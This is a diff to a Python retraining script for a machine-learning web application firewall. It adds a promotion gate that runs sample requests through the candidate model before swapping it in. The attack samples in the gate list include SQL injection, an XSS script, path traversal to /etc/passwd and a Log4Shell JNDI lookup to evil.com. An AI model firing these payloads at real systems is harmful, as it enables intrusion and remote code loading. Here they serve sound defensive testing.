@@ -2,7 +2,9 @@ import sqlite3
 import pandas as pd
 import numpy as np
 import joblib
+import os
 import re
+import onnxruntime as rt
 from scipy.stats import entropy
 from sklearn.feature_extraction.text import TfidfVectorizer
 from sklearn.preprocessing import StandardScaler
@@ -20,6 +22,29 @@ VERIFIED_STATUSES = (
     "TRAINED_NORMAL",
     "TRAINED_ATTACK",
 )
+LIVE_ARTIFACTS = {
+    "vectorizer": "tfidf_vectorizer_v2.pkl",
+    "scaler": "standard_scaler_v2.pkl",
+    "model": "waf_brain_v2.onnx",
+}
+CANDIDATE_ARTIFACTS = {
+    "vectorizer": "candidate_tfidf_vectorizer_v2.pkl",
+    "scaler": "candidate_standard_scaler_v2.pkl",
+    "model": "candidate_waf_brain_v2.onnx",
+}
+PROMOTION_NORMALS = [
+    "http://localhost:8080/tienda1/imagenes/nuevo_logo.png",
+    "http://localhost:8080/tienda1/imagenes/nuevo_logo.png HTTP/1.1",
+    "GET http://localhost:8080/tienda1/imagenes/nuevo_logo.png HTTP/1.1\n",
+    "http://localhost:8080/tienda1/index.jsp HTTP/1.1",
+    "http://localhost:8080/tienda1/publico/carrito.jsp?checkout=true",
+]
+PROMOTION_ATTACKS = [
+    "http://localhost:8080/login?user=admin' OR 1=1 --&pwd=x HTTP/1.1",
+    "http://localhost:8080/search?q=<script>alert('XSS')</script> HTTP/1.1",
+    "http://localhost:8080/tienda1/publico/../../../../etc/passwd HTTP/1.1",
+    "http://localhost:8080/api?token=${jndi:ldap://evil.com/exploit} HTTP/1.1",
+]
 
 # --- 1. Utility Functions (Must match exactly) ---
 def calculate_scipy_entropy(text):
@@ -55,6 +80,52 @@ def has_attack_signature(text):
         r"(?i)/etc/passwd",
     ]
     return any(re.search(pattern, text) for pattern in patterns)
+
+def build_feature_row(raw_request, vectorizer, scaler):
+    numeric = pd.DataFrame([{
+        'length': len(raw_request),
+        'entropy': calculate_scipy_entropy(raw_request),
+        'sql_kw_count': sql_keyword_count(raw_request),
+        'digit_ratio': digit_ratio(raw_request),
+        'uppercase_ratio': uppercase_ratio(raw_request),
+    }])
+    return hstack([
+        scaler.transform(numeric),
+        vectorizer.transform([raw_request]),
+    ]).toarray().astype(np.float32)
+
+def validate_candidate(vectorizer, scaler, model_path):
+    session = rt.InferenceSession(model_path, providers=['CPUExecutionProvider'])
+    input_name = session.get_inputs()[0].name
+    output_names = [output.name for output in session.get_outputs()]
+    failures = []
+
+    for payload in PROMOTION_NORMALS:
+        features = build_feature_row(payload, vectorizer, scaler)
+        outputs = session.run(output_names, {input_name: features})
+        pred = int(outputs[0][0])
+        if pred != 0:
+            failures.append(f"normal failed: {payload}")
+
+    for payload in PROMOTION_ATTACKS:
+        features = build_feature_row(payload, vectorizer, scaler)
+        outputs = session.run(output_names, {input_name: features})
+        pred = int(outputs[0][0])
+        if pred != 1:
+            failures.append(f"attack failed: {payload}")
+
+    return failures
+
+def promote_candidate():
+    for path in LIVE_ARTIFACTS.values():
+        backup_path = f"{path}.bak"
+        if os.path.exists(path):
+            if os.path.exists(backup_path):
+                os.remove(backup_path)
+            os.replace(path, backup_path)
+
+    for key, candidate_path in CANDIDATE_ARTIFACTS.items():
+        os.replace(candidate_path, LIVE_ARTIFACTS[key])
 
 # --- 2. Extract Verified Logs from Database ---
 print("Fetching newly verified threat intelligence...")
@@ -143,15 +214,25 @@ model.fit(X_final, y)
 
 # --- 6. Export the Upgraded System ---
 print("Exporting upgraded assets...")
-joblib.dump(vectorizer, 'tfidf_vectorizer_v2.pkl')
-joblib.dump(scaler, 'standard_scaler_v2.pkl')
+joblib.dump(vectorizer, CANDIDATE_ARTIFACTS["vectorizer"])
+joblib.dump(scaler, CANDIDATE_ARTIFACTS["scaler"])
 
 feature_count = X_final.shape[1]
 initial_type = [('float_input', FloatTensorType([None, feature_count]))]
 onnx_model = convert_sklearn(model, initial_types=initial_type)
 
-with open("waf_brain_v2.onnx", "wb") as f:
+with open(CANDIDATE_ARTIFACTS["model"], "wb") as f:
     f.write(onnx_model.SerializeToString())
+
+print("Running promotion gate...")
+failures = validate_candidate(vectorizer, scaler, CANDIDATE_ARTIFACTS["model"])
+if failures:
+    print("Promotion gate failed. Live model was not changed.")
+    for failure in failures:
+        print(f"  - {failure}")
+    raise SystemExit(1)
+
+promote_candidate()
 
 conn = sqlite3.connect("waf_quarantine.db")
 conn.execute("UPDATE blocked_requests SET status = 'TRAINED_NORMAL' WHERE status = 'VERIFIED_NORMAL'")
@@ -159,4 +240,5 @@ conn.execute("UPDATE blocked_requests SET status = 'TRAINED_ATTACK' WHERE status
 conn.commit()
 conn.close()
 
-print("\nSuccess! System is healed. The API will hot-reload the updated v2 assets on the next request.")
+print("\nSuccess! Candidate passed the promotion gate and replaced the live v2 assets.")
+print("The API will hot-reload the updated model on the next request.")
